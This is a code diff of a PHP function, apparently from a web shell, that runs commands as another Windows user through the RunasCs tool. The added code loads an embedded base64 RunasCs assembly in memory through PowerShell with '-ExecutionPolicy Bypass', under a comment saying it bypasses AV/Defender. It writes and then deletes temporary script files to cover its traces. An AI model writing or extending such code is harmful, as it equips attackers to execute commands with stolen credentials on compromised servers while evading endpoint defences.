@@ -53,20 +53,32 @@ function get_runascs_path() {
 // Execute command as another user via RunasCs with fallback for long commands
 function runascs_exec($user, $pass, $cmd, $cwd = '') {
     $exe = get_runascs_path();
-    if ($exe === '') return '[-] RunasCs.exe not found on disk';
     $prefix = $cwd !== '' ? 'cd /d ' . escapeshellarg($cwd) . ' && ' : '';
     $full = $prefix . $cmd;
-    // CreateProcessWithLogonW has ~1024 char limit; use .bat for long commands
-    if (strlen($full) < 900) {
-        $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $full) . '" 2>&1';
-        $out = esila_exec($rc);
+    if ($exe !== '') {
+        // Method 1: RunasCs.exe on disk
+        if (strlen($full) < 900) {
+            $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $full) . '" 2>&1';
+            $out = esila_exec($rc);
+        } else {
+            $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
+            $bat = $tmp . '\\esila_' . mt_rand(10000,99999) . '.bat';
+            @file_put_contents($bat, "@echo off\r\n" . $full . "\r\n");
+            $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $bat) . '" 2>&1';
+            $out = esila_exec($rc);
+            @unlink($bat);
+        }
     } else {
+        // Method 2: In-memory via PowerShell (bypasses AV/Defender)
         $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
-        $bat = $tmp . '\\esila_' . mt_rand(10000,99999) . '.bat';
-        @file_put_contents($bat, "@echo off\r\n" . $full . "\r\n");
-        $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $bat) . '" 2>&1';
-        $out = esila_exec($rc);
-        @unlink($bat);
+        $ps1 = $tmp . '\\esila_rc' . mt_rand(10000,99999) . '.ps1';
+        $ps = '$b=[Convert]::FromBase64String(' . ps_quote(RUNASCS_B64) . ");\r\n"
+            . "\$a=[Reflection.Assembly]::Load(\$b);\r\n"
+            . '$r=[RunasCs.Program]::Main(@(' . ps_quote($user) . ',' . ps_quote($pass) . ',' . ps_quote('cmd /c ' . $full) . "));\r\n"
+            . "if(\$r -ne \$null){\$r}\r\n";
+        @file_put_contents($ps1, $ps);
+        $out = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
+        @unlink($ps1);
     }
     // Strip RunasCs [*] warning lines but keep [-] errors
     $lines = explode("\n", $out);
